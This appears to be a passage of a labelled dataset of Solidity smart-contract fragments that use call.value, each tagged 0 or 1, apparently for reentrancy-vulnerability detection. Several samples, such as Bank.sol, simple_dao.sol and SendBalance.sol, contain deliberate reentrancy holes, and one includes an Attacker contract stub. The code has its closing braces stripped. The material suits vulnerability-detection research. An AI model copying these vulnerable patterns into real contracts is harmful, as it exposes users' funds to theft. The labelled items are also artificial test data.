1694 9920.sol
9920.sol
function tryExec(address target, bytes calldata, uint value) internal returns (bool call_ret){
return target.call.value(value)(calldata);
function exec(address target, bytes calldata, uint value) internal {
if(!tryExec(target, calldata, value)) {
throw;
function tryExec( address t, bytes c ) internal returns (bool) {
return tryExec(t, c, 0);
function tryExec( address t, uint256 v ) internal returns (bool) {
bytes memory c; return tryExec(t, c, v);
contract DSMath {
0
---------------------------------
1695 32605.sol
32605.sol
function forward(address destination, uint value, bytes data) public onlyOwner {
require(destination.call.value(value)(data));
Forwarded(destination, value, data);
contract MetaIdentityManager {
uint adminTimeLock;
uint userTimeLock;
uint adminRate;
address relay;
event LogIdentityCreated(
address indexed identity,
address indexed creator,
address owner,
address indexed recoveryKey);
event LogOwnerAdded(
address indexed identity,
address indexed owner,
address instigator);
event LogOwnerRemoved(
address indexed identity,
address indexed owner,
address instigator);
event LogRecoveryChanged(
address indexed identity,
address indexed recoveryKey,
address instigator);
event LogMigrationInitiated(
address indexed identity,
address indexed newIdManager,
address instigator);
event LogMigrationCanceled(
address indexed identity,
address indexed newIdManager,
address instigator);
event LogMigrationFinalized(
address indexed identity,
address indexed newIdManager,
address instigator);
mapping(address => mapping(address => uint)) owners;
mapping(address => address) recoveryKeys;
mapping(address => mapping(address => uint)) limiter;
mapping(address => uint) public migrationInitiated;
mapping(address => address) public migrationNewAddress;
modifier onlyAuthorized() {
require(msg.sender == relay || checkMessageData(msg.sender));
_;
modifier onlyOwner(address identity, address sender) {
require(isOwner(identity, sender));
_;
modifier onlyOlderOwner(address identity, address sender) {
require(isOlderOwner(identity, sender));
_;
modifier onlyRecovery(address identity, address sender) {
require(recoveryKeys[identity] == sender);
_;
modifier rateLimited(Proxy identity, address sender) {
require(limiter[identity][sender] < (now - adminRate));
limiter[identity][sender] = now;
_;
modifier validAddress(address addr) {
require(addr != address(0));
_;
function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) {
Proxy identity = new Proxy();
owners[identity][owner] = now - adminTimeLock;
recoveryKeys[identity] = recoveryKey;
LogIdentityCreated(identity, msg.sender, owner,  recoveryKey);
identity.forward(destination, 0, data);
function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){
identity.forward(destination, value, data);
0
---------------------------------
1696 22416.sol
22416.sol
function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable {
if(Holders[_addr]>0)  {
if(_addr.call.value(_wei)()){
Holders[_addr]-=_wei;
0
---------------------------------
1697 40090.sol
40090.sol
function multiAccessCallD(address _to, uint _value, bytes _data, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _to, _value, _data)) returns(bool) {
return _to.call.value(_value)(_data);
function() returns(bool) {
return multiAccessCall(multiAccessRecipient, msg.value, msg.data);
function multiAccessCall(address _to, uint _value, bytes _data) returns(bool) {
return this.multiAccessCallD(_to, _value, _data, msg.sender);
0
---------------------------------
1698 Bank.sol
Bank.sol
function withdraw(){
require(msg.sender.call.value(balances[msg.sender])());
balances[msg.sender]=0;
contract Attacker{
address public bankAddr;
uint attackCount = 0;
constructor(address _bank){
bankAddr = _bank;
1
---------------------------------
1699 dumbDAO.sol
dumbDAO.sol
function withdraw(address _recipient) returns (bool) {
if (balances[msg.sender] == 0){
InsufficientFunds(balances[msg.sender],balances[msg.sender]);
throw;
PaymentCalled(_recipient, balances[msg.sender]);
if (_recipient.call.value(balances[msg.sender])()) {
balances[msg.sender] = 0;
return true;
1
---------------------------------
1700 8342.sol
8342.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyCommittee returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
0
---------------------------------
1701 31912.sol
31912.sol
function serveTx(WalletData storage self,  address _to, uint256 _value,  bytes _txData,  bool _confirm,    bytes _data)  public returns (bool,bytes32)  {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
1702 17043.sol
17043.sol
function withdraw() public {
msg.sender.call.value(balances[msg.sender])();
balances[msg.sender] = 0;
1
---------------------------------
1703 18170.sol
18170.sol
function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
require(_amount <= wingsETHRewards);
require(_contract.call.value(_amount)());
wingsETHRewards -= _amount;
0
---------------------------------
1704 40469.sol
40469.sol
function _forward(address _to, bytes _data) internal returns(bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return false;
_to.call.value(msg.value)(_data);
return _applyRefund(startGas);
0
---------------------------------
1705 33450.sol
33450.sol
function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){
if (isConfirmed(TransHash)) {
Transactions[TransHash].executed = true;
require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data));
Execution(TransHash);
function confirmTransaction(bytes32 TransHash) public onlyOwner(){
addConfirmation(TransHash);
executeTransaction(TransHash);
0
---------------------------------
1706 14945.sol
14945.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
1
---------------------------------
1707 4591.sol
4591.sol
function finishDistribution() onlyOwner canDistr public returns (bool) {
crowdsaleClosed = true;
uint256 amount = tokenReward.sub(amountRaisedIsc);
balances[beneficiary] = balances[beneficiary].add(amount);
emit Transfer(address(0), beneficiary, amount);
require(msg.sender.call.value(amountRaised)());
return true;
0
---------------------------------
1708 40092.sol
40092.sol
function withdrawPayments() external  returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) { throw; }
success = true;
0
---------------------------------
1709 simple_dao.sol
simple_dao.sol
function withdraw(uint amount) public{
if (credit[msg.sender]>= amount) {
require(msg.sender.call.value(amount)());
credit[msg.sender]-=amount;
1
---------------------------------
1710 1403.sol
1403.sol
function transfer( address to,   uint value,  bytes data, string custom_fallback ) public returns (bool success)  {
_transfer( msg.sender, to, value, data );
if ( isContract(to) ) {
ContractReceiver rx = ContractReceiver( to );
require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) );
return true;
function transfer(address to, uint256 value) public returns (bool success) {
bytes memory empty;
_transfer( msg.sender, to, value, empty );
return true;
function transferFrom( address from, address to, uint256 value ) public returns (bool success) {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer( from, to, value, empty );
return true;
function transfer( address to, uint value, bytes data ) public returns (bool success) {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer(msg.sender, to, value, data );
return true;
function transferToContract( address to, uint value, bytes data ) private returns (bool success) {
_transfer(msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback( msg.sender, value, data );
return true;
1
---------------------------------
1711 21900.sol
21900.sol
function crowdsale() public payable returns (bool) {
require(msg.value >= limit);
uint256 vv = msg.value;
uint256 coin = crowdsalePrice.mul(vv);
require(coin.add(totalSupply) <= supplyLimit);
require(crowdsaleSupply.add(coin) <= crowdsaleTotal);
balances[msg.sender] = coin.add(balances[msg.sender]);
totalSupply = totalSupply.add(coin);
crowdsaleSupply = crowdsaleSupply.add(coin);
balances[msg.sender] = coin;
require(owner.call.value(msg.value)());
return true;
contract GGPCToken is Crowdsale {
string public name = "Global game payment currency";
string public symbol = "GGPC";
string public version = '1.0.2';
0
---------------------------------
1712 17518.sol
17518.sol
function sendTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
1713 32559.sol
32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1714 40118.sol
40118.sol
function withdrawEtherOrThrow(uint256 amount) private {
if (msg.sender != owner) throw;
bool result = owner.call.value(amount)();
if (!result) { throw;}
function refund() noEther onlyOwner {
if (tokenBalance == 0) throw;
tokenBalance = 0;
withdrawEtherOrThrow(tokenBalance * tokenPrice);
0
---------------------------------
1715 cross-function-reentrancy.sol
cross-function-reentrancy.sol
function WithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
require(recipient.call.value(amountToWithdraw)());
function GetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {
throw;
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
claimedBonus[recipient] = true;
1
---------------------------------
1716 25196.sol
25196.sol
function getTokens(uint num, address tokenBuyerContract) public {
tokenBuyerContract.call.value(0 wei)();
1
---------------------------------
1717 27024.sol
27024.sol
function participate() payable onlyHuman {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if (luckyNumberOfAddress(msg.sender) == winnerLuckyNumber)  {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
1718 simple_dao_fixed.sol
simple_dao_fixed.sol
function withdraw(uint amount) public {
if (credit[msg.sender]>= amount) {
credit[msg.sender]-=amount;
require(msg.sender.call.value(amount)());
0
---------------------------------
1719 35421.sol
35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal  returns (bool call_ret){
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
_;
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) 	internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}  else {
0
---------------------------------
1720 347.sol
347.sol
function _forwardFunds() internal {
bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)();
emit TokensTransfer (msg.sender, wallet, msg.value, isTransferDone);
0
---------------------------------
1721 3985.sol
3985.sol
function performFeelessTransaction(address sender, address target, bytes data, uint256 nonce, bytes sig) public payable {
require(this == target);
bytes memory prefix = "\x19Ethereum Signed Message:\n32";
bytes32 hash = keccak256(prefix, keccak256(target, data, nonce));
msgSender = ECRecovery.recover(hash, sig);
require(msgSender == sender);
require(nonces[msgSender]++ == nonce);
require(target.call.value(msg.value)(data));
msgSender = address(0);
0
---------------------------------
1722 39019.sol
39019.sol
function CreateTokens() {
if (tokensCreated > 0) return;
uint amount = amountRaised * (100 - rewardPercentage) / 100;
if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw;
tokensCreated = tokenContract.balanceOf(this);
tokenCreator = msg.sender;
0
---------------------------------
1723 35637.sol
35637.sol
function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) {
if(isContract(_to)) {
require(balanceOf(msg.sender) >= _value);
balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
balances[_to] = safeAdd(balanceOf(_to), _value);
ContractReceiver receiver = ContractReceiver(_to);
receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1724 28869.sol
28869.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId)  {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public  ownerExists(msg.sender)  transactionExists(transactionId) notConfirmed(transactionId, msg.sender)  {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1725 18438.sol
18438.sol
function invest() public {
uint256 amountToSend = address(this).balance;
if(amountToSend > 1){
uint256 half = amountToSend / 2;
require(sk2xContract.call.value(half)());
p3dContract.buy.value(half)(msg.sender);
function donate() payable public {
require(sk2xContract.call.value(msg.value).gas(1000000)());
0
---------------------------------
1726 14758.sol
14758.sol
function wcf(address target, uint256 a) payable {
require(msg.sender == owner);
uint startBalance = this.balance;
target.call.value(msg.value)(bytes4(keccak256("play(uint256)")), a);
if (this.balance <= startBalance) revert();
owner.transfer(this.balance);
0
---------------------------------
1727 14994.sol
14994.sol
function collectOwedDividends() public returns (uint _amount) {
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
0
---------------------------------
1728 35806.sol
35806.sol
function withdraw(uint amount) {
require(tokens[0][msg.sender] >= amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);
require(msg.sender.call.value(amount)());
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
1729 40241.sol
40241.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1730 21697.sol
21697.sol
function Jump() public payable  {
if(msg.value > 1 ether)  {
msg.sender.call.value(this.balance);
1
---------------------------------
1731 10107.sol
10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1732 39191.sol
39191.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {  throw; }
return true;
return false;
uint constant DEFAULT_SEND_GAS = 100000;
0
---------------------------------
1733 5515.sol
5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1734 17009.sol
17009.sol
function Pay(address _destination) public payable {
require(_destination != 0x0);
require(msg.value > 0);
require(!paused);
masterWallet.transfer(msg.value.div(9));
_destination.call.value(msg.value.div(9).mul(8))();
SettleFund(_destination, msg.value);
1
---------------------------------
1735 23421.sol
23421.sol
function _safeCall(address _to, uint _amount) internal {
require(_to != 0);
require(_to.call.value(_amount)());
function multiCall(address[] _address, uint[] _amount) payable public returns(bool) {
for (uint i = 0; i < _address.length; i++) {
_safeCall(_address[i], _amount[i]);
return true;
1
---------------------------------
1736 27486.sol
27486.sol
function Command(address adr,bytes data)  payable  public  {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
1737 40353.sol
40353.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1738 39684.sol
39684.sol
function () payable {
if (msg.data.length > 0) {
createSeries(msg.data, 0, "", "", 0x0);
} else if (latestSeriesForUser[msg.sender] != 0) {
if (latestSeriesForUser[msg.sender].call.value(msg.value)())
DepositMade(latestSeriesForUser[msg.sender], msg.value);
} else {
createSeries("", 0, "", "", 0x0);
contract SeriesFactory {
address public seriesFactory;
address public owner;
0
---------------------------------
1739 9611.sol
9611.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1740 23387.sol
23387.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId){
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1741 27334.sol
27334.sol
function participate() payable {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if ( luckyNumberOfAddress(msg.sender) == luckyNumber) {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
1742 39644.sol
39644.sol
function revoke(address transactor, address transactee) {
if (msg.sender != transactor && msg.sender != transactee) { throw; }
if(!verify(transactor, transactee)) { throw; }
uint32 deposit = _verifications[transactor][transactee];
delete _verifications[transactor][transactee];
if (!transactee.call.value(deposit).gas(23000)()) {  throw;  }
RevokeEvent(transactor, transactee, deposit);
0
---------------------------------
1743 36563.sol
36563.sol
function forward(address _destination, uint256 _value, bytes _data) onlyOwner {
require(_destination != address(0));
assert(_destination.call.value(_value)(_data));
if (_value > 0) {
Withdrawal(_destination, _value, _data);
function() payable {
Deposit(msg.sender, msg.value);
0
---------------------------------
1744 11719.sol
11719.sol
function Collect(uint _am) public payable {
if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {
if(msg.sender.call.value(_am)())  {
balances[msg.sender]-=_am;
Log.AddMessage(msg.sender,_am,"Collect");
function() public payable {
Deposit();
contract LogFile
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1745 24007.sol
24007.sol
function GetEther() public payable {
if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) {
msg.sender.call.value(0.3 ether);
ExtractDepositTime[msg.sender] = 0;
1
---------------------------------
1746 1879.sol
1879.sol
function upgradeToAndCall(address newImplementation, bytes data) payable external ifAdmin {
_upgradeTo(newImplementation);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
1747 39269.sol
39269.sol
function sendPending() public preventReentry isHolder(msg.sender) returns (bool){
if (ptxTail == ptxHead) return false;
TX memory tx = pendingTxs[ptxTail];
if(now < tx.timeLock) return false;
delete pendingTxs[ptxTail++];
if(!tx.blocked) {
if(tx.to.call.value(tx.value)(tx.data)) {
committedEther -= tx.value;
Withdrawal(tx.from, tx.to, tx.value);
return true;
if (tx.from == address(this)) {
committedEther -= tx.value;
} else {
holders[tx.from].etherBalance += tx.value;
TransactionFailed(tx.from, tx.to, tx.value);
return false;
0
---------------------------------
1748 10604.sol
10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
1749 26188.sol
26188.sol
function GetPrizeFund() public payable {
require(now>EndTime);
require(Bids[msg.sender]>=MaxOffer);
uint prizeAmount = Bids[msg.sender]+PrizeFund;
PrizeFund = 0;
Bids[msg.sender]=0;
msg.sender.call.value(prizeAmount);
function RevokeBid() public payable {
require(now>EndTime);
uint toTransfer = Bids[msg.sender];
Bids[msg.sender]=0;
msg.sender.call.value(toTransfer);
0
---------------------------------
1750 2021.sol
2021.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _safeSend(address _to, uint _value) internal {
if (!_unsafeSend(_to, _value)) {
throw;
0
---------------------------------
1751 14274.sol
14274.sol
function withdraw(uint _amount) {
require(tokens[0][msg.sender] >= _amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], _amount);
if (!msg.sender.call.value(_amount)()) {
revert();
Withdraw(0, msg.sender, _amount, tokens[0][msg.sender]);
function instantTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,   uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _store) payable {
uint totalValue = safeMul(_amount, 1004) / 1000;
if (_tokenGet == address(0)) {
if (msg.value != totalValue) {
revert();
TokenStore(_store).deposit.value(totalValue)();
} else {
if (!Token(_tokenGet).transferFrom(msg.sender, this, totalValue)) {
revert();
if (!Token(_tokenGet).approve(_store, totalValue)) {
revert();
TokenStore(_store).depositToken(_tokenGet, totalValue);
TokenStore(_store).trade(_tokenGet, _amountGet, _tokenGive, _amountGive,
_expires, _nonce, _user, _v, _r, _s, _amount);
totalValue = TokenStore(_store).balanceOf(_tokenGive, this);
uint customerValue = safeMul(_amountGive, _amount) / _amountGet;
if (_tokenGive == address(0)) {
TokenStore(_store).withdraw(totalValue);
msg.sender.transfer(customerValue);
} else {
TokenStore(_store).withdrawToken(_tokenGive, totalValue);
if (!Token(_tokenGive).transfer(msg.sender, customerValue)) {
revert();
0
---------------------------------
1752 40341.sol
40341.sol
function carefulSendWithFixedGas(address _toAddress,  uint _valueWei,  uint _extraGasIncluded ) internal returns (bool success) {
return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)();
contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin {
mapping (address => uint) funds;
event FundsWithdrawnEvent(
address fromAddress,
address toAddress,
uint valueWei
);
function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded ) internal {
if (msg.value != 0) {   throw;   }
address fromAddress = msg.sender;
if (_valueWei > funds[fromAddress]) {  throw;    }
funds[fromAddress] -= _valueWei;
bool sentOk = carefulSendWithFixedGas(  _toAddress,   _valueWei,   _extraGasIncluded );
if (!sentOk) { throw;   }
FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei);
contract MoneyRounderMixin {
function compensateLatestMonarch(uint _compensationWei) internal {
address compensationAddress = latestMonarchInternal().compensationAddress;
latestMonarchInternal().compensationWei = _compensationWei;
bool sentOk = carefulSendWithFixedGas(  compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends  );
if (sentOk) {
CompensationSentEvent(compensationAddress, _compensationWei);
} else {
funds[compensationAddress] += _compensationWei;
CompensationFailEvent(compensationAddress, _compensationWei);
contract KingdomFactory {
0
---------------------------------
1753 SendBalance.sol
SendBalance.sol
function withdrawBalance(){
if (!(msg.sender.call.value(userBalances[msg.sender])())) { throw ; }
userBalances[msg.sender] = 0;
1
---------------------------------
1754 39866.sol
39866.sol
function funding() payable {
if(fundingLock||block.number<startBlock||block.number>startBlock+blockDuration) throw;
if(balances[msg.sender]>balances[msg.sender]+msg.value*fundingExchangeRate || msg.value>msg.value*fundingExchangeRate) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*fundingExchangeRate;
Funding(msg.sender,msg.value);
function buy(string _commit) payable{
if(balances[msg.sender]>balances[msg.sender]+msg.value*price || msg.value>msg.value*price) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*price;
commit[msg.sender]=_commit;
Buy(msg.sender,msg.value);
1
---------------------------------
1755 39127.sol
39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
1756 39912.sol
39912.sol
function simulatePathwayFromBeneficiary() public payable {
bytes4 buySig = bytes4(sha3("buy()"));
if (!Resilience.call.value(msg.value)(buySig)) throw;
bytes4 transferSig = bytes4(sha3("transfer(address,uint256)"));
if (!Resilience.call(transferSig, msg.sender, msg.value)) throw;
0
---------------------------------
1757 34577.sol
34577.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId)   public   ownerExists(msg.sender)    notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1758 cross-function-reentrancy-fixed.sol
cross-function-reentrancy-fixed.sol
function untrustedWithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
if (recipient.call.value(amountToWithdraw)() == false) {  throw;}
function untrustedGetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {throw;}
claimedBonus[recipient] = true;
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
0
---------------------------------
1759 21999.sol
21999.sol
function call(address addr, bytes data, uint256 amount) public payable onlyOwner {
if (msg.value > 0)
deposit();
require(addr.call.value(amount)(data));
Call(msg.sender, addr, amount);
0
---------------------------------
1760 21755.sol
21755.sol
function Collect(uint _am) public payable  {
var acc = Acc[msg.sender];
if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {
if(msg.sender.call.value(_am)())  {
acc.balance-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function()     public     payable   {
Put(0);
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1761 16884.sol
16884.sol
function mintETHRewards(address _contract,  uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
1762 23803.sol
23803.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
1763 22074.sol
22074.sol
function Collect(uint _am) public payable {
if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender]) {
msg.sender.call.value(_am);
Bal[msg.sender]-=_am;
1
---------------------------------
1764 39326.sol
39326.sol
function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers {
